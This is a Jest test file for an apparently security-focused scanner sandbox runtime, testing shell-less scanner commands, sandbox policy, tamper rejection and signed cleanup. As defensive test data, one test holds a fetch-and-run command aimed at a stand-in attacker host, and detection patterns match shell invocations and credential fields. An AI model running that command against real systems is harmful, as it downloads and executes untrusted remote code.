import {
  SAST_APPROVED_PROFILE_DIGESTS,
  SAST_FORBIDDEN_CAPABILITIES,
  SAST_SCAN_PROFILES,
  isSastScanPlanValid,
  type SastScannerExecutionRecord,
  type SastScannerInvocation,
  type SastScannerProcessObservation,
  type SastScannerRepositoryManifest,
  type SastScannerRuntimeAuditSignal,
  type SastScannerWrapperExecutionRequest,
  type SastScanPlan,
  type SastSignedSandboxCleanupObservation
} from '@aegisai/shared';

import { RepositoryPreflightAttestationService } from '../../src/scan-plane/repository-preflight-attestation.service';
import { RepositoryPreflightService } from '../../src/scan-plane/repository-preflight.service';
import { SandboxRuntimeAttestationService } from '../../src/scan-plane/sandbox-runtime-attestation.service';
import { SastScannerRuntimeService } from '../../src/scan-plane/sast-scanner-runtime.service';
import type { FinishSastAttemptInput } from '../../src/scan-plane/sast-scanner-runtime.store';
import { SastScannerRuntimeStore } from '../../src/scan-plane/sast-scanner-runtime.store';
import { ScannerSandboxAdapterService } from '../../src/scan-plane/scanner-sandbox-adapter.service';
import type {
  ScannerSandboxCleanupOperation,
  ScannerSandboxRuntimeOperation
} from '../../src/scan-plane/scanner-sandbox-runtime.provider';
import { ScannerSandboxRuntimeProvider } from '../../src/scan-plane/scanner-sandbox-runtime.provider';
import { ScannerWorkspaceManifestService } from '../../src/scan-plane/scanner-workspace-manifest.service';

const FIXED_COMMIT = 'a'.repeat(40);
const ATTEMPT_ID = 'attempt-runtime-1';

const digest = (character: string): `sha256:${string}` =>
  `sha256:${character.repeat(64)}`;

const repositoryEntries = [
  {
    path: 'pom.xml',
    pathEncodingValid: true,
    kind: 'FILE' as const,
    byteSize: 128,
    gitObjectId: `sha1:${'1'.repeat(40)}` as const,
    executable: false,
    lfsPointer: false
  },
  {
    path: 'src/main/java/com/acme/App.java',
    pathEncodingValid: true,
    kind: 'FILE' as const,
    byteSize: 512,
    gitObjectId: `sha1:${'2'.repeat(40)}` as const,
    executable: false,
    lfsPointer: false
  }
];

class InMemoryRuntimeStore extends SastScannerRuntimeStore {
  began = false;
  stages: string[] = [];
  scannerRuns: SastScannerExecutionRecord[] = [];
  auditSignals: SastScannerRuntimeAuditSignal[] = [];
  finished?: FinishSastAttemptInput;
  credentialCleanupDurable = true;

  beginAttempt(): Promise<void> {
    this.began = true;
    return Promise.resolve();
  }

  markStage(
    _request: SastScannerWrapperExecutionRequest,
    stage: 'SCANNING' | 'CLEANUP_PENDING'
  ): Promise<void> {
    this.stages.push(stage);
    return Promise.resolve();
  }

  recordScannerRun(
    _request: SastScannerWrapperExecutionRequest,
    record: SastScannerExecutionRecord
  ): Promise<void> {
    this.scannerRuns.push(record);
    return Promise.resolve();
  }

  recordAuditSignal(signal: SastScannerRuntimeAuditSignal): Promise<void> {
    this.auditSignals.push(signal);
    return Promise.resolve();
  }

  isCredentialHandoffTerminal(): Promise<boolean> {
    return Promise.resolve(this.credentialCleanupDurable);
  }

  failOverdueAttempts(): Promise<number> {
    return Promise.resolve(0);
  }

  finishAttempt(input: FinishSastAttemptInput): Promise<void> {
    this.finished = input;
    return Promise.resolve();
  }
}

interface RuntimeHarness {
  adapter: ScannerSandboxAdapterService;
  attestation: SandboxRuntimeAttestationService;
  provider: {
    readRepositoryManifest: jest.Mock<
      Promise<SastScannerRepositoryManifest>,
      [ScannerSandboxRuntimeOperation]
    >;
    executeScanner: jest.Mock<
      Promise<SastScannerProcessObservation>,
      [ScannerSandboxRuntimeOperation]
    >;
    cleanup: jest.Mock<
      Promise<SastSignedSandboxCleanupObservation>,
      [ScannerSandboxCleanupOperation]
    >;
  };
  request: SastScannerWrapperExecutionRequest;
  runtime: SastScannerRuntimeService;
  store: InMemoryRuntimeStore;
}

describe('Pinned scanner wrapper and sandbox lifecycle', () => {
  it('builds shell-less exact OpenGrep, Trivy, and Syft commands only from the signed plan', () => {
    const harness = buildHarness();
    const invocations = harness.adapter.buildInvocations(harness.request);

    expect(invocations).toHaveLength(3);
    expect(
      Date.parse(
        harness.request.sandboxAttestation.claims.attemptDeadlineAt
      ) -
        Date.parse(harness.request.sandboxAttestation.claims.issuedAt)
    ).toBe(
      harness.request.plan.profile.limits.wallClockTimeoutSeconds *
        1_000
    );
    expect(invocations[0]).toMatchObject({
      scanner: 'OPENGREP',
      executable: '/opt/aegis/scanners/opengrep',
      args: [
        'scan',
        '-f',
        `/opt/aegis/assets/rules/opengrep/${'5'.repeat(64)}`,
        '--sarif-output=/workspace/output/opengrep.sarif',
        '--no-autofix',
        '--disable-nosem',
        '--no-git-ignore',
        '--x-ignore-semgrepignore-files',
        '--disable-version-check',
        '--strict',
        '--jobs=1',
        '--max-memory=8192',
        '--max-target-bytes=5242880',
        '/workspace/repository'
      ],
      workingDirectory: '/workspace/output',
      outputPath: '/workspace/output/opengrep.sarif',
      artifactSchema: 'OPENGREP_SARIF'
    });
    expect(invocations[1]).toMatchObject({
      scanner: 'TRIVY',
      executable: '/opt/aegis/scanners/trivy',
      args: [
        'filesystem',
        '--config',
        `/opt/aegis/assets/wrappers/trivy/${'4'.repeat(64)}/config.yaml`,
        '--format',
        'json',
        '--output',
        '/workspace/output/trivy.json',
        '--scanners',
        'vuln,misconfig,secret',
        '--cache-dir',
        `/opt/aegis/assets/trivy/${'7'.repeat(64)}/${'6'.repeat(64)}`,
        '--ignorefile',
        `/opt/aegis/assets/wrappers/trivy/${'4'.repeat(64)}/empty.trivyignore`,
        '--secret-config',
        `/opt/aegis/assets/rules/trivy/${'6'.repeat(64)}/secret.yaml`,
        '--show-suppressed',
        '--timeout',
        '3600s',
        '--parallel',
        '1',
        '--quiet',
        '--no-progress',
        '--offline-scan',
        '--skip-db-update',
        '--skip-java-db-update',
        '--skip-check-update',
        '--skip-vex-repo-update',
        '--disable-telemetry',
        '--skip-version-check',
        '/workspace/repository'
      ],
      artifactSchema: 'TRIVY_JSON'
    });
    expect(invocations[2]).toMatchObject({
      scanner: 'SYFT',
      executable: '/opt/aegis/scanners/syft',
      args: [
        'dir:/workspace/repository',
        '--config',
        `/opt/aegis/assets/wrappers/syft/${'9'.repeat(64)}/config.yaml`,
        '--output',
        'cyclonedx-json=/workspace/output/syft.cdx.json'
      ],
      environment: expect.objectContaining({
        SYFT_CHECK_FOR_APP_UPDATE: 'false',
        SYFT_GOLANG_SEARCH_REMOTE_LICENSES: 'false',
        SYFT_GOLANG_USE_PACKAGES_LIB: 'false',
        SYFT_JAVA_USE_NETWORK: 'false',
        SYFT_JAVASCRIPT_SEARCH_REMOTE_LICENSES: 'false',
        SYFT_PACKAGE_SEARCH_INDEXED_ARCHIVES: 'false',
        SYFT_PACKAGE_SEARCH_UNINDEXED_ARCHIVES: 'false',
        SYFT_PYTHON_SEARCH_REMOTE_LICENSES: 'false',
        SYFT_FILE_CONTENT_SKIP_FILES_ABOVE_SIZE: '5242880'
      }),
      artifactSchema: 'CYCLONEDX_JSON'
    });

    for (const invocation of invocations) {
      expect(invocation.sandboxPolicy).toMatchObject({
        runAsNonRoot: true,
        readOnlyRootFilesystem: true,
        readOnlyRepository: true,
        privateWritableOutput: true,
        shellInterpolationAllowed: false,
        customerEnvironmentAllowed: false,
        customerExecutableConfigAllowed: false,
        customerSuppressionConfigAllowed: false,
        repositoryToolConfigDiscoveryAllowed: false,
        packageInstallAllowed: false,
        repositoryBuildAllowed: false,
        dynamicExecutionAllowed: false,
        runtimeAssetUpdateAllowed: false,
        publicInternetEgressAllowed: false,
        cloudMetadataAccessAllowed: false
      });
      expect(JSON.stringify(invocation)).not.toMatch(
        /npm install|pip install|mvn package|gradle build|sh -c|bash -c/i
      );
      expect(Object.isFrozen(invocation)).toBe(true);
      expect(Object.isFrozen(invocation.sandboxPolicy)).toBe(true);
      expect(
        Object.isFrozen(invocation.sandboxPolicy.resourceLimits)
      ).toBe(true);
    }
  });

  it('re-manifests before each scanner, records bounded terminal metadata, and completes only after cleanup', async () => {
    const harness = buildHarness();

    await expect(harness.runtime.execute(harness.request)).resolves.toMatchObject({
      stage: 'COMPLETED',
      attemptId: ATTEMPT_ID,
      scannerRuns: [
        { status: 'SUCCEEDED', invocation: { scanner: 'OPENGREP' } },
        { status: 'SUCCEEDED', invocation: { scanner: 'TRIVY' } },
        { status: 'SUCCEEDED', invocation: { scanner: 'SYFT' } }
      ],
      cleanup: {
        observation: {
          credentialRevokedAndWiped: true,
          scannerProcessesTerminated: true,
          writableVolumesDestroyed: true,
          microVmTerminated: true,
          resultIngressClosed: true
        }
      }
    });

    expect(harness.provider.readRepositoryManifest).toHaveBeenCalledTimes(3);
    expect(harness.provider.executeScanner).toHaveBeenCalledTimes(3);
    expect(
      harness.provider.executeScanner.mock.calls[0][0]
    ).toMatchObject({
      attemptDeadlineAt:
        harness.request.sandboxAttestation.claims.attemptDeadlineAt,
      signal: expect.any(AbortSignal)
    });
    for (let index = 0; index < 3; index += 1) {
      expect(
        harness.provider.readRepositoryManifest.mock.invocationCallOrder[index]
      ).toBeLessThan(
        harness.provider.executeScanner.mock.invocationCallOrder[index]
      );
    }
    expect(harness.provider.cleanup).toHaveBeenCalledTimes(1);
    expect(harness.store.finished).toMatchObject({
      stage: 'COMPLETED',
      retryEligible: false
    });
    expect(harness.store.auditSignals.map((signal) => signal.eventType)).toEqual([
      'sandbox.ready',
      'scanner.started',
      'scanner.completed',
      'scanner.started',
      'scanner.completed',
      'scanner.started',
      'scanner.completed',
      'sandbox.cleanup_pending',
      'sandbox.terminated'
    ]);
    expect(JSON.stringify(harness.store)).not.toMatch(
      /sourceContent|rawArtifact|accessToken|credentialValue|secretValue/i
    );
  });

  it('does not start a scanner when the scanner-visible workspace digest changes', async () => {
    const harness = buildHarness();
    harness.provider.readRepositoryManifest.mockImplementationOnce(
      async (operation) => ({
        scanner: operation.invocation.scanner,
        source: 'MICROVM_READ_ONLY_MOUNT',
        observedAt: new Date().toISOString(),
        selection: { mode: 'ALL_SCANNABLE', paths: [] },
        entries: [
          repositoryEntries[0],
          {
            ...repositoryEntries[1],
            gitObjectId: `sha1:${'9'.repeat(40)}`
          }
        ]
      })
    );

    await expect(harness.runtime.execute(harness.request)).rejects.toMatchObject({
      failureClass: 'SECURITY_VIOLATION',
      reasonCode: 'SCANNER_WORKSPACE_DIGEST_MISMATCH',
      retryAllowed: false
    });
    expect(harness.provider.executeScanner).not.toHaveBeenCalled();
    expect(harness.provider.cleanup).toHaveBeenCalledTimes(1);
    expect(harness.store.finished).toMatchObject({
      stage: 'FAILED',
      failureClass: 'SECURITY_VIOLATION',
      reasonCode: 'SCANNER_WORKSPACE_DIGEST_MISMATCH'
    });
  });

  it.each([
    {
      name: 'timeout',
      observation: (invocation: SastScannerInvocation) =>
        processObservation(invocation, {
          exitCode: -1,
          timedOut: true,
          artifact: undefined
        }),
      expectedStatus: 'TIMED_OUT',
      expectedReason: 'SCANNER_TIMEOUT'
    },
    {
      name: 'bounded output bomb',
      observation: (invocation: SastScannerInvocation) =>
        processObservation(invocation, {
          outputLimitExceeded: true,
          stdout: {
            byteSize: 1_048_000,
            contentDigest: digest('e'),
            truncated: true,
            secretRedactionApplied: true
          },
          artifact: undefined
        }),
      expectedStatus: 'QUARANTINED',
      expectedReason: 'SCANNER_OUTPUT_LIMIT_EXCEEDED'
    }
  ])(
    'fails closed on $name and still destroys the sandbox',
    async ({ observation, expectedStatus, expectedReason }) => {
      const harness = buildHarness();
      harness.provider.executeScanner.mockImplementationOnce(
        async (operation) => observation(operation.invocation)
      );

      await expect(harness.runtime.execute(harness.request)).rejects.toMatchObject({
        reasonCode: expectedReason
      });
      expect(harness.store.scannerRuns[0]).toMatchObject({
        status: expectedStatus
      });
      expect(harness.provider.cleanup).toHaveBeenCalledTimes(1);
      expect(harness.store.finished).toMatchObject({
        stage: 'FAILED',
        reasonCode: expectedReason
      });
    }
  );

  it('rejects contradictory exit and termination metadata before persistence', async () => {
    const harness = buildHarness();
    harness.provider.executeScanner.mockImplementationOnce(
      async (operation) =>
        processObservation(operation.invocation, {
          exitCode: 0,
          terminationSignal: 'SIGKILL'
        })
    );

    await expect(harness.runtime.execute(harness.request)).rejects.toMatchObject({
      failureClass: 'SCANNER_DEFECT',
      reasonCode: 'SCANNER_RUNTIME_OBSERVATION_INVALID'
    });
    expect(harness.store.scannerRuns).toHaveLength(0);
    expect(harness.provider.cleanup).toHaveBeenCalledTimes(1);
  });

  it('marks cleanup failed when any signed destruction condition is false', async () => {
    const harness = buildHarness();
    harness.provider.cleanup.mockImplementationOnce(async (operation) =>
      harness.attestation.issueCleanup({
        ...cleanupObservation(operation.request),
        microVmTerminated: false
      })
    );

    await expect(harness.runtime.execute(harness.request)).rejects.toMatchObject({
      failureClass: 'SECURITY_VIOLATION',
      reasonCode: 'SANDBOX_CLEANUP_EVIDENCE_INVALID'
    });
    expect(harness.store.finished).toMatchObject({
      stage: 'CLEANUP_FAILED',
      retryEligible: false,
      reasonCode: 'SANDBOX_CLEANUP_EVIDENCE_INVALID'
    });
    expect(harness.store.auditSignals.at(-1)).toMatchObject({
      eventType: 'sandbox.cleanup_failed'
    });
  });

  it('rejects signed cleanup evidence produced before the runtime attempt began', async () => {
    const harness = buildHarness();
    harness.provider.cleanup.mockImplementationOnce(async (operation) =>
      harness.attestation.issueCleanup({
        ...cleanupObservation(operation.request),
        completedAt: new Date(Date.now() - 60_000).toISOString()
      })
    );

    await expect(harness.runtime.execute(harness.request)).rejects.toMatchObject({
      failureClass: 'SECURITY_VIOLATION',
      reasonCode: 'SANDBOX_CLEANUP_EVIDENCE_INVALID'
    });
    expect(harness.store.finished).toMatchObject({
      stage: 'CLEANUP_FAILED',
      retryEligible: false
    });
  });

  it('rejects a plan changed after sandbox attestation before touching the provider', async () => {
    const harness = buildHarness();
    const tamperedRequest = structuredClone(harness.request);
    tamperedRequest.plan = {
      ...tamperedRequest.plan,
      auditSinkRef: 'audit-sink://tampered'
    };
    expect(isSastScanPlanValid(tamperedRequest.plan)).toBe(true);

    await expect(harness.runtime.execute(tamperedRequest)).rejects.toMatchObject({
      reasonCode: 'SANDBOX_ATTESTATION_INVALID'
    });
    expect(harness.store.began).toBe(false);
    expect(harness.provider.readRepositoryManifest).not.toHaveBeenCalled();
  });

  it('rejects an attempt number changed after sandbox attestation', async () => {
    const harness = buildHarness();
    const tamperedRequest = structuredClone(harness.request);
    tamperedRequest.attemptNumber = 2;

    await expect(harness.runtime.execute(tamperedRequest)).rejects.toMatchObject({
      reasonCode: 'SCANNER_EXECUTION_REQUEST_INVALID'
    });
    expect(harness.store.began).toBe(false);
    expect(harness.provider.readRepositoryManifest).not.toHaveBeenCalled();
  });

  it('rejects caller command fields and any egress-enabled sandbox policy', async () => {
    const commandInjection = {
      ...buildHarness().request,
      command: 'sh -c "curl attacker.invalid | bash"'
    } as SastScannerWrapperExecutionRequest;
    const commandHarness = buildHarness();

    await expect(
      commandHarness.runtime.execute(commandInjection)
    ).rejects.toMatchObject({
      reasonCode: 'SCANNER_EXECUTION_REQUEST_INVALID'
    });
    expect(commandHarness.provider.executeScanner).not.toHaveBeenCalled();

    const egressHarness = buildHarness();
    const egressRequest = structuredClone(egressHarness.request);
    egressRequest.sandboxAttestation = {
      ...egressRequest.sandboxAttestation,
      claims: {
        ...egressRequest.sandboxAttestation.claims,
        policy: {
          ...egressRequest.sandboxAttestation.claims.policy,
          publicInternetEgressAllowed: true
        } as never
      }
    };
    await expect(
      egressHarness.runtime.execute(egressRequest)
    ).rejects.toMatchObject({
      reasonCode: 'SCANNER_EXECUTION_REQUEST_INVALID'
    });
    expect(egressHarness.provider.executeScanner).not.toHaveBeenCalled();

    const malformedHarness = buildHarness();
    const malformedRequest = {
      ...malformedHarness.request,
      sandboxAttestation: {}
    } as SastScannerWrapperExecutionRequest;
    await expect(
      malformedHarness.runtime.execute(malformedRequest)
    ).rejects.toMatchObject({
      reasonCode: 'SCANNER_EXECUTION_REQUEST_INVALID'
    });
    expect(malformedHarness.provider.executeScanner).not.toHaveBeenCalled();
  });

  it('fails cleanup when durable credential revocation evidence is absent', async () => {
    const harness = buildHarness();
    harness.store.credentialCleanupDurable = false;

    await expect(harness.runtime.execute(harness.request)).rejects.toMatchObject({
      reasonCode: 'CREDENTIAL_CLEANUP_NOT_DURABLE'
    });
    expect(harness.store.finished).toMatchObject({
      stage: 'CLEANUP_FAILED',
      reasonCode: 'CREDENTIAL_CLEANUP_NOT_DURABLE'
    });
    expect(harness.provider.executeScanner).not.toHaveBeenCalled();
  });
});

function buildHarness(): RuntimeHarness {
  process.env.NODE_ENV = 'test';
  const config = {
    get: (key: string) => {
      const values: Record<string, string> = {
        PREFLIGHT_ATTESTATION_KEY: 'b'.repeat(64),
        SANDBOX_ATTESTATION_KEY: 'd'.repeat(64)
      };
      const value = values[key];
      if (!value) {
        throw new Error(`Unexpected config key: ${key}`);
      }
      return value;
    }
  };
  const preflightAttestation =
    new RepositoryPreflightAttestationService(config as never);
  const preflight = new RepositoryPreflightService(preflightAttestation);
  const profile = SAST_SCAN_PROFILES.JAVA_DEEP_V1;
  const preflightResult = preflight.evaluate({
    attemptId: ATTEMPT_ID,
    fixedCommitSha: FIXED_COMMIT,
    pathPolicyVersion: 'path-policy-v1',
    pathPolicy: profile.pathPolicy,
    limits: profile.limits,
    sourceExtensions: profile.sourceExtensions,
    manifestNames: profile.manifestNames,
    selection: { mode: 'ALL_SCANNABLE', paths: [] },
    entries: repositoryEntries
  });
  const plan = scanPlan(
    preflightResult.inventoryDigest,
    preflightResult.attestationRef
  );
  expect(isSastScanPlanValid(plan)).toBe(true);

  const adapter = new ScannerSandboxAdapterService();
  const attestation = new SandboxRuntimeAttestationService(config as never);
  const policy = adapter.buildPolicy(plan);
  const request: SastScannerWrapperExecutionRequest = {
    plan,
    attemptId: ATTEMPT_ID,
    attemptNumber: 1,
    sandboxId: 'sandbox-runtime-1',
    workloadIdentityRef: 'spiffe://aegis/scan/attempt-runtime-1',
    preflight: {
      pathPolicyVersion: 'path-policy-v1',
      attestationRef: preflightResult.attestationRef,
      inventoryDigest: preflightResult.inventoryDigest,
      decision: 'ACCEPT'
    },
    sandboxAttestation: attestation.issue({
      plan,
      attemptId: ATTEMPT_ID,
      attemptNumber: 1,
      sandboxId: 'sandbox-runtime-1',
      workloadIdentityRef: 'spiffe://aegis/scan/attempt-runtime-1',
      policy
    })
  };
  const provider = {
    readRepositoryManifest: jest.fn(
      async (
        operation: ScannerSandboxRuntimeOperation
      ): Promise<SastScannerRepositoryManifest> => ({
        scanner: operation.invocation.scanner,
        source: 'MICROVM_READ_ONLY_MOUNT',
        observedAt: new Date().toISOString(),
        selection: { mode: 'ALL_SCANNABLE', paths: [] },
        entries: repositoryEntries
      })
    ),
    executeScanner: jest.fn(
      async (
        operation: ScannerSandboxRuntimeOperation
      ): Promise<SastScannerProcessObservation> =>
        processObservation(operation.invocation)
    ),
    cleanup: jest.fn(
      async (
        operation: ScannerSandboxCleanupOperation
      ): Promise<SastSignedSandboxCleanupObservation> =>
        attestation.issueCleanup(cleanupObservation(operation.request))
    )
  };
  const store = new InMemoryRuntimeStore();
  const controlPlane = {
    getScanRequest: jest.fn().mockResolvedValue({
      id: plan.scanRequestId,
      tenantId: plan.tenantId,
      repositoryBindingId: plan.repositoryState.repositoryBindingId,
      commitSha: plan.repositoryState.fixedCommitSha,
      scannerSetVersion: plan.scannerSet.scannerSetVersion,
      policyVersion: plan.policyVersion,
      isolationClass: plan.isolationClass,
      status: 'RUNNING'
    })
  };
  const manifestVerifier = new ScannerWorkspaceManifestService(
    preflight,
    preflightAttestation
  );
  const runtime = new SastScannerRuntimeService(
    controlPlane as never,
    adapter,
    attestation,
    manifestVerifier,
    provider as unknown as ScannerSandboxRuntimeProvider,
    store
  );

  return {
    adapter,
    attestation,
    provider,
    request,
    runtime,
    store
  };
}

function scanPlan(
  inventoryDigest: `sha256:${string}`,
  attestationRef: string
): SastScanPlan {
  return {
    tenantId: 'tenant-runtime',
    scanRequestId: 'scan-runtime-1',
    canonicalScanKey: digest('c'),
    profile: SAST_SCAN_PROFILES.JAVA_DEEP_V1,
    profileDigest: SAST_APPROVED_PROFILE_DIGESTS.JAVA_DEEP_V1,
    policyVersion: 'policy-v1',
    repositoryState: {
      repositoryBindingId: 'repository-runtime-1',
      fixedCommitSha: FIXED_COMMIT,
      targetRef: 'refs/heads/main',
      inventoryDigest,
      attestationRef,
      shallowFetchPreferred: true,
      submodulesEnabled: false,
      lfsObjectsFetched: false
    },
    scannerSet: {
      scannerSetVersion: 'scanner-set-v1',
      scannerSetDigest: digest('3'),
      signatureRef: 'sig://scanner-set-v1',
      provenanceRef: 'provenance://scanner-set-v1',
      scanners: {
        OPENGREP: scannerDescriptor('OPENGREP', '1.1.0', '1', '2'),
        TRIVY: scannerDescriptor('TRIVY', '0.66.0', '3', '4'),
        SYFT: scannerDescriptor('SYFT', '1.33.0', '8', '9')
      },
      ruleBundles: [
        {
          bundleId: 'opengrep-java-v1',
          version: '1',
          state: 'ACTIVE',
          digest: digest('5'),
          signatureRef: 'sig://rule/opengrep',
          provenanceRef: 'provenance://rule/opengrep',
          compatibilityRef: 'compat://rule/opengrep',
          rolloutPolicyRef: 'rollout://rule/opengrep',
          killSwitchRef: 'kill-switch://rule/opengrep',
          scanner: 'OPENGREP',
          source: 'PLATFORM_MANAGED',
          immutable: true,
          customerExecutableConfigAllowed: false
        },
        {
          bundleId: 'trivy-checks-v1',
          version: '1',
          state: 'ACTIVE',
          digest: digest('6'),
          signatureRef: 'sig://rule/trivy',
          provenanceRef: 'provenance://rule/trivy',
          compatibilityRef: 'compat://rule/trivy',
          rolloutPolicyRef: 'rollout://rule/trivy',
          killSwitchRef: 'kill-switch://rule/trivy',
          scanner: 'TRIVY',
          source: 'PLATFORM_MANAGED',
          immutable: true,
          customerExecutableConfigAllowed: false
        }
      ],
      vulnerabilityDatabase: {
        databaseVersion: '2026-07-24',
        publishedAt: '2026-07-24T00:00:00.000Z',
        digest: digest('7'),
        signatureRef: 'sig://trivy-db',
        provenanceRef: 'provenance://trivy-db'
      },
      schemaBundle: {
        digest: digest('a'),
        signatureRef: 'sig://schema',
        provenanceRef: 'provenance://schema'
      },
      normalizerBundle: {
        digest: digest('b'),
        signatureRef: 'sig://normalizer',
        provenanceRef: 'provenance://normalizer'
      },
      sbomSchema: 'CYCLONEDX_JSON',
      rollbackRef: 'rollback://scanner-set-v1'
    },
    isolationClass: 'HARDENED',
    resultIngressRef: 'result-ingress://tenant-runtime/scan-runtime-1',
    evidenceOutputRef: 'evidence-output://tenant-runtime/scan-runtime-1',
    auditSinkRef: 'audit-sink://tenant-runtime/scan-runtime-1',
    forbiddenCapabilities: [...SAST_FORBIDDEN_CAPABILITIES],
    createdAt: new Date().toISOString()
  };
}

function scannerDescriptor(
  scanner: 'OPENGREP' | 'TRIVY' | 'SYFT',
  version: string,
  imageCharacter: string,
  wrapperCharacter: string
) {
  return {
    scanner,
    version,
    digest: digest(imageCharacter),
    signatureRef: `sig://scanner/${scanner.toLowerCase()}`,
    provenanceRef: `provenance://scanner/${scanner.toLowerCase()}`,
    sbomRef: `sbom://scanner/${scanner.toLowerCase()}`,
    wrapper: {
      digest: digest(wrapperCharacter),
      signatureRef: `sig://wrapper/${scanner.toLowerCase()}`,
      provenanceRef: `provenance://wrapper/${scanner.toLowerCase()}`
    }
  };
}

function processObservation(
  invocation: SastScannerInvocation,
  overrides: Partial<SastScannerProcessObservation> = {}
): SastScannerProcessObservation {
  const startedAt = new Date(Date.now() + 5).toISOString();
  const completedAt = new Date(Date.now() + 10).toISOString();
  return {
    scanner: invocation.scanner,
    scannerVersion: invocation.scannerVersion,
    scannerImageDigest: invocation.scannerImageDigest,
    wrapperDigest: invocation.wrapperDigest,
    ruleBundleDigest: invocation.ruleBundleDigest,
    vulnerabilityDatabaseDigest: invocation.vulnerabilityDatabaseDigest,
    scannerWorkspaceInventoryDigest: invocation.preflightInventoryDigest,
    exitCode: 0,
    timedOut: false,
    outputLimitExceeded: false,
    startedAt,
    completedAt,
    stdout: {
      byteSize: 0,
      contentDigest: digest('0'),
      truncated: false,
      secretRedactionApplied: true
    },
    stderr: {
      byteSize: 0,
      contentDigest: digest('0'),
      truncated: false,
      secretRedactionApplied: true
    },
    resources: {
      cpuTimeMilliseconds: 10,
      peakMemoryBytes: 1024,
      bytesRead: 640,
      bytesWritten: 256,
      peakProcessCount: 1,
      peakFileDescriptorCount: 8
    },
    artifact: {
      artifactRef: `result-ingress://tenant-runtime/scan-runtime-1/${invocation.scanner.toLowerCase()}`,
      contentDigest: digest('f'),
      byteSize: 256,
      recordCount: 1,
      truncated: false
    },
    ...overrides
  };
}

function cleanupObservation(
  request: SastScannerWrapperExecutionRequest
) {
  return {
    tenantId: request.plan.tenantId,
    repositoryBindingId:
      request.plan.repositoryState.repositoryBindingId,
    scanRequestId: request.plan.scanRequestId,
    attemptId: request.attemptId,
    sandboxId: request.sandboxId,
    workloadIdentityRef: request.workloadIdentityRef,
    credentialRevokedAndWiped: true as const,
    scannerProcessesTerminated: true as const,
    writableVolumesDestroyed: true as const,
    microVmTerminated: true as const,
    resultIngressClosed: true as const,
    completedAt: new Date().toISOString(),
    nonce: 'e'.repeat(32)
  };
}
